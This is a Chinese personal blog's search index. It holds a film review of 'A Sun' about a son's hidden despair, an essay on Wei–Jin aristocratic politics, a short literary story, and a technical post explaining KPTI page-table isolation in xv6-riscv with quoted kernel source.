<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>阳光普照</title>
    <url>/2021/02/15/%E9%98%B3%E5%85%89%E6%99%AE%E7%85%A7/</url>
    <content><![CDATA[<h2 id="充满阳光一定快乐吗"><a class="markdownIt-Anchor" href="#充满阳光一定快乐吗"></a> 充满阳光一定快乐吗？</h2>
<blockquote>
<p>这个世界，最公平的是太阳。不论纬度高低，每个地方一整年中，白天与黑暗的时间都各占一半。前几天，我们去了动物园，那天太阳很大，晒得所有动物都受不了，它们都设法找一个阴影躲起来，我有一种说不清楚模糊的感觉，我也好希望跟这些动物一样，有一些阴影可以躲起来，但是我环顾四周，不只是这些动物有阴影可以躲，包括你，我弟，甚至是司马光，都可以找到一个有阴影的角落。</p>
<p>可是我没有，我没有水缸，没有暗处，我只有阳光。</p>
<p>二十四小时从不间断，明亮温暖，阳光普照。</p>
</blockquote>
<p>阿豪品学兼优、待人和善，父亲将全部的期望寄予在他身上，并且每年都送给他上面写有“把握时间 掌握方向”的笔记本。他因为高考时没有考上第一志愿的医学院而选择复读。当他的家庭因为弟弟阿和入狱而险些分崩离析的时候，他选择充当父亲和母亲之间的桥梁，替父亲处理他不愿意处理的事情，带阿和的女朋友小玉去产检并主动带她去少年辅育所去看阿和却不欢而散。</p>
<p>就这样一位优秀的青年，父母眼中的好孩子，老师眼中的好学生，却选择在一个平静的深夜，整理好房间的衣物，将手机里的短讯全部删除后毫无征兆地坠楼身亡。从前有多光芒万丈，在坠楼时就有多寂寞冷清。</p>
<p>尽管阿豪看起来阳光和善，脸上却时常带着忧郁的神色。他在自习室的时候幻想其他学生都在睡觉却只有自己醒着；在上国文课的时候因为走神而被老师叫起来，而又因为质疑老师而被赶出教室；在吃饭的时候面对同学提出的问题而选择沉默不语。这种种迹象都在表明阿豪并没有像他表现的一样快乐，他也有很重的心事，但却没有一个人真正知道他在想什么。关于他的心事，我们只能从他自杀前给晓真发的短讯中猜测一二。</p>
<p>阿豪寄予了家人太多的希望与表面看起来的关心，但没有一个人懂他的心事，也没有一个人可以去倾听他讲话，他成为了家庭里所有人的情绪垃圾桶，融化了其他人的负面情绪，却从不曾有人倾听他的心事，没有暗处可以躲藏与歇息，终于他选择结束了自己的生命，到地下长眠。</p>
<p><img src="/2021/02/15/%E9%98%B3%E5%85%89%E6%99%AE%E7%85%A7/img2.jpg" alt></p>
<h2 id="向谁倾诉"><a class="markdownIt-Anchor" href="#向谁倾诉"></a> 向谁倾诉？</h2>
<p>晓真的出现或许可以成为阿豪生命的转折点，但电影最终还是无情地让阿豪陨落来达到艺术的高潮。如果晓真可以早出现一些或许就可以阻止这场悲剧的发生。</p>
<p>晓真或许和阿豪有相似的经历，晓真与阿豪的气质相似，总是带着淡淡的忧伤，而只有晓真才可以静静地聆听阿豪的故事。在阿豪送晓真上公交车的晚上，晓真宁愿错过搭乘公交车也要听完阿豪讲完他关于司马光砸缸的故事。后来阿豪每天都去送晓真上公交车并在周末同晓真去动物园。或许是晓真同阿豪的对话触及到了阿豪的灵魂深处，或许这是一场早有预谋的自杀。在那之后阿豪不再与晓真联系也不再上学，又过了一周以后选择在一个夜深人静的晚上自杀，没有留下任何痕迹。</p>
<p>有可以倾诉的人是一件幸福的事，但一个可悲的事实是一个人可以倾诉的对象并不太多。很多人交了成千上万的朋友，但是翻遍了朋友圈却没有一个人可以用来倾诉情绪。</p>
<p><img src="/2021/02/15/%E9%98%B3%E5%85%89%E6%99%AE%E7%85%A7/img3.jpg" alt></p>
<h2 id="昼夜循环"><a class="markdownIt-Anchor" href="#昼夜循环"></a> 昼夜循环</h2>
<p>一个人只有阳光是不行的，只有阳光就会像阿豪那样在无孔不入的烈阳下骤然陨落；只有黑暗也是不行的，那就会像菜头那样无人救赎而逐渐堕入邪道，即使最后被杀也无人关心。阳光是前进的动力，而黑暗则是躲避的角落。</p>
<p>在我们的生活中，经常有各种各样的劝人向上的言论和文章，也有很多“正能量”，但这些中的有些，很可能是毫无作用的甚至是有害的，它只可能会使当事人曝晒在阳光之下。许多善用“正能量”话术的人实际上并不是真正的正能量，他只是希望你同他的想法来办事。半年前的缪可馨事件如是，十年前的宋山木事件亦如是。</p>
<p>在我国众多名校乃至全世界的著名高校中时常会有学生因为受不了压力而产生自杀的念头。外界将他们过度地神话而减少了对与其作为人的关怀，使他们灼烤在阳光之下，不胜痛苦。</p>
<blockquote>
<p>一个真正阳光普照的世界，但凡它错落多姿一些，有亭台轩榭和山川草木，它一定有阴影和黑暗。但只有漆黑无光的深夜，才是彻底和绝对的统一的黑色。</p>
</blockquote>
<p><img src="/2021/02/15/%E9%98%B3%E5%85%89%E6%99%AE%E7%85%A7/img4.jpg" alt></p>
]]></content>
      <categories>
        <category>电影</category>
      </categories>
      <tags>
        <tag>人生</tag>
      </tags>
  </entry>
  <entry>
    <title>RISC -V总结</title>
    <url>/2021/02/09/RISC-V%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>魏晋之际的政治格局简论</title>
    <url>/2020/07/29/%E9%AD%8F%E6%99%8B%E4%B9%8B%E9%99%85%E7%9A%84%E6%94%BF%E6%B2%BB%E6%A0%BC%E5%B1%80%E7%AE%80%E8%AE%BA/</url>
    <content><![CDATA[<p>关于东晋之际的门阀政治体系，被视为变态、畸形发展的政治体系，但其出现并非空穴来风。</p>
<p>其一，东汉末年，士人清议之风盛起，出现了匹夫抗愤，处士横议的局面，士人之间互相品题、共相标榜成为一时风气，普通士人一旦为名士所赞赏、品题，便如登龙门，身价倍增，千里求名之举亦不鲜见。尽管汉末党锢之祸对于士人清议进行了严酷镇压，但却加强了士人群体身份的认同，构成汉晋时代“士的觉醒”的重要面向。后来随着一系列事件，此时进入三国鼎立时代。其时曹魏举荐人才的主要方式之一便是名士品评、提携同郡士人，例如当时司马懿曾被同郡河内杨俊、清河崔琰所举荐。通过互相的举荐和品评，可以加强同乡同郡之间的家族关系，并且品评人和被品评人也可以在朝廷中为自己增加政治资源。例如，《三国志.杨俊传》中写道：</p>
<blockquote>
<p>黄初三年，车驾至宛，以市不丰乐，发怒收（杨）俊。尚书仆射司马宣王、常侍王象、荀纬请俊，叩头流血，帝不许。俊曰：“吾知罪矣。”遂自杀，众冤痛之。</p>
</blockquote>
<a id="more"></a>
<p>司马懿、王象、荀纬三人皆为河内人，自然不是一种巧合，体现出同乡官僚在政治上互相支持与提携。其时家族之间的互相品评、联姻，来上升或者加固大族的地位并且由此进行入仕，这无疑可以看做是魏晋时期阶级固化的一个重要原因。</p>
<p>其二，魏晋嬗代发生在三国鼎立之际，其时魏国仍然强敌环伺，蜀将姜维频频北伐。所以魏晋嬗代之际不可能进行大规模的政治清洗。例如高平陵事变，虽说“同日斩戮，名士减半”，但其所株连多是没有什么政治背景之人物。其时仍然大多曹魏元老仍然“心存曹氏”，大规模地进行政治清洗也会使曹魏功臣对司马氏心存憎恶，甚至可能进行政治变动，因此司马家族事实上并不具备大规模政治清洗的客观条件。而曹爽的改革正是由于开罪了曹魏功臣集团，才给司马懿带来了可乘之机。作为这场政治斗争的胜利者，曹爽的前车之鉴，对于司马家族而言显得格外深刻，这也使司马氏更加深切地认识到这些功臣贵戚子弟在曹魏政治中所具有的盘根错节、不可低估的整治潜力。因此，拉拢而不是打击曹魏贵戚子弟成为了司马氏的既定策略，这些曹魏贵戚子弟只要在政治上表示支持司马氏，无论是主动还是勉强，甚至是被迫，只要对司马氏家族专权的局面表示默认，司马氏一般都予以宽容。</p>
<p>因此，在曹爽败亡后，司马懿只是对与其关系最密切的何宴、邓飏、丁谧、李胜等人痛下杀手，而对于曹爽阵营里的声望最高的夏侯玄仅以闲职处之。因此，司马懿上台后的政治诛杀，表面上看来株连不少，但除了曹爽一支外，并没有损害曹魏政权中原有的的权势网络。很多士人虽然曾仕于曹爽，但很多并未遭到株连和问责，很多后来都逐渐转变为司马氏之臣，甚至贾充还成为了司马氏的心腹。</p>
<p>其三，各个世家大族通过品评、联姻等方式进行家族之间的联合，逐渐成为了地域与文化乃至政治方面的认同。出身世家的士人看不起出身寒微之人，对他们在政治上屡加排挤。而由于宗室、功臣形成了一股政治平衡，根基未稳的司马氏亦不敢开罪世家大族。</p>
<p>例如，曹魏在伐蜀战役中，根据钟会的谋划，魏军最初的战略意图是发动一个钳形攻势：钟会统帅伐蜀部队的主力十余万，从骆谷、斜谷的大路进取汉中；邓艾与诸葛绪各统军三万人从陇西进攻，进行战略牵制。邓艾进取甘松、沓中阻挠姜维的行动，诸葛绪进占武街、桥头切断姜维的退路，前后夹击，阻止姜维退向汉中，以使钟会率领魏军主力能够迅速占领汉中，打开进攻成都的通道。但由于诸葛绪在行动上的犹豫，差了一日的行程而未能阻截到姜维，姜维得以成功地从桥头突破，引军退往剑阁，依仗天险，与钟会率领的魏军主力相持。按照原计划的安排，邓艾本来应该和诸葛绪一样，引军东向，与钟会率领的主力会师，因为在伐蜀战役中，虽然名义上是“诏诸君伐蜀，皆指授节度”，但实际上钟会是这场战役的真正领导者。但由于姜维已抢先一步退往剑阁，据险防守，魏军原来的战略意图已无实现的可能，邓艾向东与钟会会师，并无实际意义。</p>
<p>因此邓艾决定改走阴平小路，穿越七百里的无人山地，绕过姜维所驻守的剑阁，直取成都。邓艾果敢的军事行动使他统帅的这支偏师立下灭蜀的首功。但是由于邓艾此举的确违背了事先的计划，尽管他在行动前曾上言司马昭，但却并没有知会钟会，钟会作为这次伐蜀战役的策划者与领导者，最终却无功而返，这对于一向骄傲自满的钟会而言无疑是个不小的挫折，钟会是一个权力欲和报复心强的人。并且由于邓艾在灭蜀之后专擅独行，“辄依邓禹故事，承制拜刘禅行骠骑将军，太子奉车、诸王驸马都督。蜀群司各随高下拜为王官，或领艾官署。以师纂领益州刺史，陇西太守牵弘等领蜀中诸郡”，在处理善后事宜时，丝毫没有征询钟会等人的意见，使得邓艾钟会的关系迅速破裂，于是钟会、卫瓘向司马昭献言，致使邓艾及其子被杀，其子弟皆流放边境。然而钟会谋反之罪，只株连了直系子弟，颍川钟氏地位受影响则有限，而邓艾仅仅以专擅之罪，不仅祸及家族，就连后来为其平反都困难重重。</p>
<p>《三国志.邓艾传》中写道：</p>
<blockquote>
<p>泰始元年，晋室践祚，诏曰：“昔太尉王淩谋废齐王，而王竟不足以守卫。征西将军邓艾，矜功失节，实应大辟。然被书之日，罢遣人众，束手受罪，比于求生遂未恶者，诚复不同。今大赦得还，若无子孙者听使立后，令祭祀不绝。</p>
</blockquote>
<p>赦免在魏末反对司马氏诸人的后裔，是西晋立国之后争取人心的一项举措。准许给邓艾立后，便是其中的一部分，但在诏书中依然强调“矜功失节，实应大辟”。在邓艾“悖逆”的罪名无法成立的情况下，依然认为邓艾之死是罪有应得，更为奇怪的是诏书将邓艾与王淩归为一类加以处置。王淩是试图推翻司马懿执政地位的人物，对于司马氏政权来说，其罪孽无疑要比邓艾深重得多，但根据诏书的解释，王淩当年谋废齐王芳之举，因为后来齐王芳本人被司马师所废，竟然变成了一次政治正确的举动，显然这是司马氏为了减轻王淩的罪责而特意发明的借口。司马氏为什么急于给反对过自己的王淩平反，而对为司马氏立下大功的邓艾却如此吝啬？其根本原因恐怕在于，王淩本人与司马氏家族及西晋官僚集团有着很深的渊源，其子王广亦是名士，王淩、王广虽被杀，但是他们的故旧殷勤依然是司马氏需要倚重的力量。这也可以解释为何晋武帝不惜屈尊降节，亲自前往琅琊王妃处见诸葛诞之子诸葛靓，与之修好。嫁给琅琊王司马伷的诸葛靓之姊，为其子司马觐取字为思祖，其所思者正为其外祖诸葛诞，这几乎是公开向司马氏叫板，而武帝依然不以为忤。因为诸葛诞同样也是魏末人士的领袖，琅琊诸葛氏更是一个在汉晋之际具有广泛影响力的名门望族。同样是涉及淮南叛乱，司马氏却从来没有想到为毋丘俭平反，在此厚此薄彼的背后有着非常微妙的政治考量。</p>
<p>而后来的石苞、王濬、张华等人皆出身寒微，其政治遭遇也与邓艾类似。</p>
<p>由此可见，魏晋虽然经历了由曹氏入司马氏的转变，但实际上由于司马氏并没有进行大规模政治清洗的条件，所以必须不断同世家大族进行妥协，并且，由于晋朝沿用了曹魏的制度，使得朝中政治门阀盘根错节，世家大族在文化、政治层面上均实现了认同，对于寒门士子多加排斥，抹杀了寒门士子的晋升之路，因此西晋刚刚建国，却显得垂垂老矣。虽然晋武帝司马炎在平吴后建立事功，声望大涨，并引入外戚弘农杨氏来抗衡宗室与功臣。但其坚决要将齐王司马攸外徙，使得宗室中两位最具才望的藩王司马攸、司马骏忿恨而死，重臣羊琇、向雄忧愤而卒；郑默、曹志等九人被免官。使得本来就盘根错节的政治局势更加动荡不安。由于晋武帝引入、培育外戚，使得其死后杨骏矫诏夺权，虽然其在夺权之后，对于功臣多加优渥对待，但由于世家大族均对杨氏心存不满，这些举措也并未收买到人心。朝中上下的不满情绪被皇后贾妃利用，使得贾后得以发动政变，尽诛杨氏一族。同时又由于贾后擅杀太子司马燏，使得宗室震怒，赵王司马伦由此入京，几百年动乱的大乱局由此肇始。</p>
]]></content>
      <categories>
        <category>历史</category>
      </categories>
      <tags>
        <tag>魏晋</tag>
      </tags>
  </entry>
  <entry>
    <title>颂歌</title>
    <url>/2020/07/06/carol/</url>
    <content><![CDATA[<p>多年以后，当他躺在一张逼仄的床上，岁月的痕迹无情地刻在他的脸上，浑浊的老眼已经迷瞪地无法睁开的时候，他依然清楚地记得，在他三十三岁那年，他从一场噩梦中惊醒，回忆起很久以前的往事。</p>
<a id="more"></a>
<p>那时他睡的床还很大、很舒服，他的生活很考究，他的床单、被罩、床垫、枕巾无一不是最好、最贵的。他的客厅里焚着名贵的香料，这大概已经是古人所用的东西，但他却偏偏喜欢。在每晚睡前，他都会点上香料，他认为香料可以帮他入眠，他是一个严重的失眠者，尽管他每天都看起来精神饱满，面带着笑容。</p>
<p>但不可避免，淡淡的幽香总会使他联想到一切受阻的事情，但这种事情好像永远也无法同他联系起来。再过几天，一件也许是他命运中最重要的事情将会发生，他将成为公司里最为年轻的合伙人。这个每个具有理想的年轻人梦寐以求的事情，，在他这里仿佛是唾手可得。但他却并不十分高兴，在满屋氤氲的香气中，他甚至闻到了苦杏仁的味道。</p>
<p>那大概是很久很久以前的事情了，他大概已经把她的模样忘却了，但总有一根像是浸了水的绸带绑在他的心上，他愈是挣扎，这绸带便缚的愈紧，就同他的失眠一般，越是努力地想要入眠，却又偏偏更加心烦迷乱。</p>
<p>“你应当知道，这件事情已经永远无法更改了”，他的朋友笑了笑，把身体向后靠了靠“像我们这样年龄的人应该很清楚，爱情不过是青春的把戏，它只能够使得人们获得一时的欢愉，但却永远无法真正的幸福，在爱情的蜜月期过后，留下的无非是油盐酱醋与满地鸡毛，人类同动物没什么区别，就像猴子一样，它站在悬崖的一边，巴望着悬崖另一边的桃子，当它得到了那个桃子，却又去巴望着更远处的另一个桃子了。即使是最幸福的婚姻，一生中也会有200次离婚的念头和50次掐死对方的想法。”</p>
<p>他叹了口气，“在我生命中的抉择中，我每一次都选择了理性。但假若有再来一次的机会的话，我宁愿换一种活法。”</p>
<p>他的朋友突然眯起眼睛，露出了神秘的笑容，“不，你依然会如此选择。”</p>
<p>在他年轻的时候，他喜欢别人的颂歌。尤其是当他考了年级第一的时候，看到别人对他敬佩且歆羡的眼神，听到别人对他的赞美与谀词，他都会真正地感到高兴。他是一个有雄心壮志的人，在与同龄的小孩子还在外面疯玩的时候，他已经在家里静静地阅读同他的年龄超前许多的东西。他是一个极具理性的人，当每次发生自己喜欢的任何东西与自己的理想相冲突的时候，他总会毫不犹豫地去选择自己的理想，但除了那个女孩。</p>
<p>他仍然记得，在很长的一段时期里，天真的未经爱情驯化的少年开始了他孤独狩猎者的生涯。从早七点起，他就独自一人坐在花园里一条不易被发现的长椅上，在杏树的树荫下假装读一本诗集，直到看见那位美丽的姑娘的经过。她身着淡蓝色的短裙，带吊袜带的长袜一直拉到膝头，一头青丝似的长发从后背垂直腰间，她昂首挺胸，目不斜视，步履轻快，鼻翼微收，她就像一头小鹿一样，走起路来有一种天生的骄傲。慢慢地，他将她理想化了，把一切不可能的美德和想象中的情感全都归属于她。他特意去买了精美的信纸与信封，在信纸上满满当当写了几千字的情书，这全部都源于他因阅读而积累的词句。</p>
<p>他除了她什么都不想了，他想将这封信偷偷地去交给她，却又偏偏患得患失，他整夜整夜地失眠，努力地使自己不去想这件事情，可这件事情却又偏偏不断地冒出心头。终于，他狠下心肠，理性又占了上风，他努力地去将她身上的光环一点点褪去，将她的美好品德忘却，幻想出她的不堪，以此来增加自己对她的厌恶之情，藉此来忘掉这件事情，他期待这种情愫就像石沉大海一样，无法再去波动他的情绪。是的，的确如此，他强大的理性使得他又可以一心一意地去追逐理想了，但在此之后他不再那么喜欢别人的颂歌了，他也逐渐变得不那么十分的高兴，他人的颂歌在他听来仿佛有了些讽刺的意味。</p>
<p>他仍然记得在高考后出分的那个晚上，他的父母从所未有的高兴，他们家的亲戚朋友轮番地来赞扬他，但他却只觉得吵闹。</p>
<p>在很长一段时间里，他都会早早地躺在床上，将手边的书放在壁橱上，将手边的灯关上，随即合上了眼皮，他在心里不断地咕哝着，“我就要睡着了”，可这种心理暗示不但毫无效果，反而使他更加的清醒了，他开始对夜晚一切微小的声音十分的敏感，钟表的震动声，窗外的车鸣声，夜鸟的振翅声。天地无此静穆，但也无此吵闹。他的脑子里又开始回放起一首首已经记不得名字的歌曲，虽然记不得名字，但旋律却格外清晰，他清楚地明白自己曾经一定非常地喜欢它们，但却偏偏记不得了。他头痛欲裂，坐起身来，拨开不透一丝光亮的窗帘，望向窗外，外面灯光微茫，偶尔有夜行的汽车驶过。他无法入眠，在昏暗的客厅里缓缓踱步，过一会儿便又坐在客厅的沙发上，紧紧盯着钟表秒针的震动。</p>
<p>后来，他又习惯了晚睡，这倒是可以使他快速入眠，不过，这倒又使得他做上了梦。在梦里，他又回到了儿时的那个应有尽有的花园去玩耍，在魔毯的承载下上天入地，他总是回忆起从前的事情，在天蒙蒙亮，乍醒过来的时候，他甚至忘记了自己是谁，他的身体姿势同平时的睡态大相径庭，仿佛他一抬手间，就可以让太阳停止运行，甚至后退，他觉得自己又是个拥有超能力的小孩子了，但刹那间的恍惚过后，他又知道自己不是。</p>
<p>今天就是他生命中极为重要的一天了，他将要成为这所上市公司的合伙人。他望向窗外，外面淅淅沥沥地滴着几滴雨点，在一场暴风雨过后，行人们又开始逐渐多了起来，他忽然心中一动，“她这时候在做什么呢？”，面对着无数的歌颂与赞美，他勉强挤出了一丝笑容，同他们握手、致谢，但他心中却厌烦无比，他不断地望向窗外，他看见了，雨停了，太阳出来了，云彩变白了。但他，想去云的彼端。</p>
<p>现在，他闭上浑浊的双眼，心里扫过往事，他至今已经明白他朋友的那个神秘的笑容是什么意味，但他仍然想，如果他死后可以不喝孟婆汤的话，他一定要换个活法。</p>
<p>（全文完）</p>
]]></content>
      <categories>
        <category>小说</category>
      </categories>
      <tags>
        <tag>爱情</tag>
        <tag>人生</tag>
      </tags>
  </entry>
  <entry>
    <title>xv6-riscv中的KPTI机制</title>
    <url>/2021/11/19/xv6-riscv%E4%B8%AD%E7%9A%84KPTI%E6%9C%BA%E5%88%B6/</url>
    <content><![CDATA[<h2 id="kpti-简述"><a class="markdownIt-Anchor" href="#kpti-简述"></a> KPTI 简述</h2>
<p>KPTI (Kernel Page Table Isolation) 机制最初的主要目的是为了缓解 KASLR 的绕过以及 CPU 侧信道攻击。</p>
<p>在 KPTI 机制中，内核态空间的内存和用户态空间的内存的隔离进一步得到了增强。</p>
<ul>
<li>内核态中的页表包括用户空间内存的页表和内核空间内存的页表。</li>
<li>用户态的页表只包括用户空间内存的页表以及必要的内核空间内存的页表，如用于处理系统调用、中断等信息的内存。</li>
</ul>
<p><img src="/2021/11/19/xv6-riscv%E4%B8%AD%E7%9A%84KPTI%E6%9C%BA%E5%88%B6/KPTI.png" alt></p>
<p>简而言之，KPTI 机制通过在系统调用等由用户态陷入内核态的过程中切换页表，使得内核态不能直接访问用户态的虚拟内存和执行用户态的代码段来避免熔断安全漏洞。</p>
<h2 id="xv6-riscv-中的-kpti"><a class="markdownIt-Anchor" href="#xv6-riscv-中的-kpti"></a> xv6-riscv 中的 KPTI</h2>
<h3 id="上下文切换"><a class="markdownIt-Anchor" href="#上下文切换"></a> 上下文切换</h3>
<p>关于用户态陷入内核态的上下文切换，定义在 <code>kernel/trampoline.S</code> 中的 <code>uservec</code> 中：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uservec:    </span><br><span class="line">	#</span><br><span class="line">        # trap.c sets stvec to point here, so</span><br><span class="line">        # traps from user space start here,</span><br><span class="line">        # in supervisor mode, but with a</span><br><span class="line">        # user page table.</span><br><span class="line">        #</span><br><span class="line">        # sscratch points to where the process&#39;s p-&gt;trapframe is</span><br><span class="line">        # mapped into user space, at TRAPFRAME.</span><br><span class="line">        #</span><br><span class="line">        </span><br><span class="line">	# swap a0 and sscratch</span><br><span class="line">        # so that a0 is TRAPFRAME</span><br><span class="line">        csrrw a0, sscratch, a0</span><br><span class="line"></span><br><span class="line">        # save the user registers in TRAPFRAME</span><br><span class="line">        sd ra, 40(a0)</span><br><span class="line">        sd sp, 48(a0)</span><br><span class="line">        sd gp, 56(a0)</span><br><span class="line">        sd tp, 64(a0)</span><br><span class="line">        sd t0, 72(a0)</span><br><span class="line">        sd t1, 80(a0)</span><br><span class="line">        sd t2, 88(a0)</span><br><span class="line">        sd s0, 96(a0)</span><br><span class="line">        sd s1, 104(a0)</span><br><span class="line">        sd a1, 120(a0)</span><br><span class="line">        sd a2, 128(a0)</span><br><span class="line">        sd a3, 136(a0)</span><br><span class="line">        sd a4, 144(a0)</span><br><span class="line">        sd a5, 152(a0)</span><br><span class="line">        sd a6, 160(a0)</span><br><span class="line">        sd a7, 168(a0)</span><br><span class="line">        sd s2, 176(a0)</span><br><span class="line">        sd s3, 184(a0)</span><br><span class="line">        sd s4, 192(a0)</span><br><span class="line">        sd s5, 200(a0)</span><br><span class="line">        sd s6, 208(a0)</span><br><span class="line">        sd s7, 216(a0)</span><br><span class="line">        sd s8, 224(a0)</span><br><span class="line">        sd s9, 232(a0)</span><br><span class="line">        sd s10, 240(a0)</span><br><span class="line">        sd s11, 248(a0)</span><br><span class="line">        sd t3, 256(a0)</span><br><span class="line">        sd t4, 264(a0)</span><br><span class="line">        sd t5, 272(a0)</span><br><span class="line">        sd t6, 280(a0)</span><br><span class="line"></span><br><span class="line">	# save the user a0 in p-&gt;trapframe-&gt;a0</span><br><span class="line">        csrr t0, sscratch</span><br><span class="line">        sd t0, 112(a0)</span><br><span class="line"></span><br><span class="line">        # restore kernel stack pointer from p-&gt;trapframe-&gt;kernel_sp</span><br><span class="line">        ld sp, 8(a0)</span><br><span class="line"></span><br><span class="line">        # make tp hold the current hartid, from p-&gt;trapframe-&gt;kernel_hartid</span><br><span class="line">        ld tp, 32(a0)</span><br><span class="line"></span><br><span class="line">        # load the address of usertrap(), p-&gt;trapframe-&gt;kernel_trap</span><br><span class="line">        ld t0, 16(a0)</span><br><span class="line"></span><br><span class="line">        # restore kernel page table from p-&gt;trapframe-&gt;kernel_satp</span><br><span class="line">        ld t1, 0(a0)</span><br><span class="line">        csrw satp, t1</span><br><span class="line">        sfence.vma zero, zero</span><br><span class="line"></span><br><span class="line">        # a0 is no longer valid, since the kernel page</span><br><span class="line">        # table does not specially map p-&gt;tf.</span><br><span class="line"></span><br><span class="line">        # jump to usertrap(), which does not return</span><br><span class="line">        jr t0</span><br></pre></td></tr></table></figure>
<p>可以看到 <code>csrw satp, t1</code> 这条语句将用户态的页表切换成了内核态的页表，也就是说，在内核态中尽管可以访问用户态页表，但无法直接通过虚拟内存访问用户态代码段，因为我们没有在内核页表中为用户代码段直接做映射。</p>
<h3 id="内核访问用户态数据"><a class="markdownIt-Anchor" href="#内核访问用户态数据"></a> 内核访问用户态数据</h3>
<p>关于内核如何访问用户态数据定义在 <code>kernel/vm.c</code> 的 <code>copyout</code> 和 <code>copyin</code> 函数中：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Copy from kernel to user.</span></span><br><span class="line"><span class="comment">// Copy len bytes from src to virtual address dstva in a given page table.</span></span><br><span class="line"><span class="comment">// Return 0 on success, -1 on error.</span></span><br><span class="line"><span class="keyword">int</span></span><br><span class="line">copyout(<span class="keyword">pagetable_t</span> pagetable, uint64 dstva, <span class="keyword">char</span> *src, uint64 len)</span><br><span class="line">&#123;</span><br><span class="line">  uint64 n, va0, pa0;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span>(len &gt; <span class="number">0</span>)&#123;</span><br><span class="line">    va0 = PGROUNDDOWN(dstva);</span><br><span class="line">    pa0 = walkaddr(pagetable, va0);</span><br><span class="line">    <span class="keyword">if</span>(pa0 == <span class="number">0</span>)</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    n = PGSIZE - (dstva - va0);</span><br><span class="line">    <span class="keyword">if</span>(n &gt; len)</span><br><span class="line">      n = len;</span><br><span class="line">    memmove((<span class="keyword">void</span> *)(pa0 + (dstva - va0)), src, n);</span><br><span class="line"></span><br><span class="line">    len -= n;</span><br><span class="line">    src += n;</span><br><span class="line">    dstva = va0 + PGSIZE;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Copy from user to kernel.</span></span><br><span class="line"><span class="comment">// Copy len bytes to dst from virtual address srcva in a given page table.</span></span><br><span class="line"><span class="comment">// Return 0 on success, -1 on error.</span></span><br><span class="line"><span class="keyword">int</span></span><br><span class="line">copyin(<span class="keyword">pagetable_t</span> pagetable, <span class="keyword">char</span> *dst, uint64 srcva, uint64 len)</span><br><span class="line">&#123;</span><br><span class="line">  uint64 n, va0, pa0;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span>(len &gt; <span class="number">0</span>)&#123;</span><br><span class="line">    va0 = PGROUNDDOWN(srcva);</span><br><span class="line">    pa0 = walkaddr(pagetable, va0);</span><br><span class="line">    <span class="keyword">if</span>(pa0 == <span class="number">0</span>)</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    n = PGSIZE - (srcva - va0);</span><br><span class="line">    <span class="keyword">if</span>(n &gt; len)</span><br><span class="line">      n = len;</span><br><span class="line">    memmove(dst, (<span class="keyword">void</span> *)(pa0 + (srcva - va0)), n);</span><br><span class="line"></span><br><span class="line">    len -= n;</span><br><span class="line">    dst += n;</span><br><span class="line">    srcva = va0 + PGSIZE;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到，为了访问用户态数据，我们需要首先将用户态的虚拟地址经过用户态页表进行地址翻译转成物理地址，之后再通过物理地址直接访问用户态数据即可，那么由于在内核中的数据段是进行 1 : 1 映射的，因此内存访问在经过 MMU 地址翻译的时候不会出错，关于内核地址映射定义在 <code>kernel/vm.c</code> 的 <code>kvmmake</code> 函数中：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Make a direct-map page table for the kernel.</span></span><br><span class="line"><span class="keyword">pagetable_t</span></span><br><span class="line">kvmmake(<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">pagetable_t</span> kpgtbl;</span><br><span class="line"></span><br><span class="line">  kpgtbl = (<span class="keyword">pagetable_t</span>) kalloc();</span><br><span class="line">  <span class="built_in">memset</span>(kpgtbl, <span class="number">0</span>, PGSIZE);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// uart registers</span></span><br><span class="line">  kvmmap(kpgtbl, UART0, UART0, PGSIZE, PTE_R | PTE_W);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// virtio mmio disk interface</span></span><br><span class="line">  kvmmap(kpgtbl, VIRTIO0, VIRTIO0, PGSIZE, PTE_R | PTE_W);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// PLIC</span></span><br><span class="line">  kvmmap(kpgtbl, PLIC, PLIC, <span class="number">0x400000</span>, PTE_R | PTE_W);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// map kernel text executable and read-only.</span></span><br><span class="line">  kvmmap(kpgtbl, KERNBASE, KERNBASE, (uint64)etext-KERNBASE, PTE_R | PTE_X);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// map kernel data and the physical RAM we&#x27;ll make use of.</span></span><br><span class="line">  kvmmap(kpgtbl, (uint64)etext, (uint64)etext, PHYSTOP-(uint64)etext, PTE_R | PTE_W);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// map the trampoline for trap entry/exit to</span></span><br><span class="line">  <span class="comment">// the highest virtual address in the kernel.</span></span><br><span class="line">  kvmmap(kpgtbl, TRAMPOLINE, (uint64)trampoline, PGSIZE, PTE_R | PTE_X);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// map kernel stacks</span></span><br><span class="line">  proc_mapstacks(kpgtbl);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">return</span> kpgtbl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="引用"><a class="markdownIt-Anchor" href="#引用"></a> 引用</h2>
<ul>
<li><a href="https://en.wikipedia.org/wiki/Kernel_page-table_isolation">KPTI WiKi</a></li>
<li><a href="https://ctf-wiki.org/pwn/linux/kernel-mode/defense/isolation/user-kernel/kpti/">KPTI CTF-WiKi</a></li>
</ul>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>RISC -V</tag>
        <tag>操作系统</tag>
      </tags>
